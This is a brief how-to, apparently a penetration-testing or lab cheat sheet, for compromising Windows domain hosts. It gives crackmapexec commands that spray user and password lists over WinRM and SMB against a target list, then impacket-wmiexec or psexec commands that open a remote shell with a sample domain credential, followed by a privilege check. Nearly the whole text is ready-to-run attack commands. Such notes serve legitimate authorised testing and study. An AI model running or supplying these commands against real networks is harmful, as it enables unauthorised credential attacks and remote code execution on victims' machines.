
# Compromising Host using Impacket

Open the kali machine and create a directory and in that create a users and password file with the creds in that and a target file containing the ip's of all the hosts and domain.

```crackmap
crackmapexec winrm target.txt -u users.txt -p password.txt --continue-on-success -d xyz.com
or
crackmapexec smb (ip) -u user -p password --computers (to list all the hosts)
```
Now run the impacket tool
```impacket
impacket-wmiexec or (psexec) xyz.com/Charlie:P@ssw0rdABC@{ip}
```
after the connection is made you can check the privileges by ( whoami /priv ) and can do other tasks also.
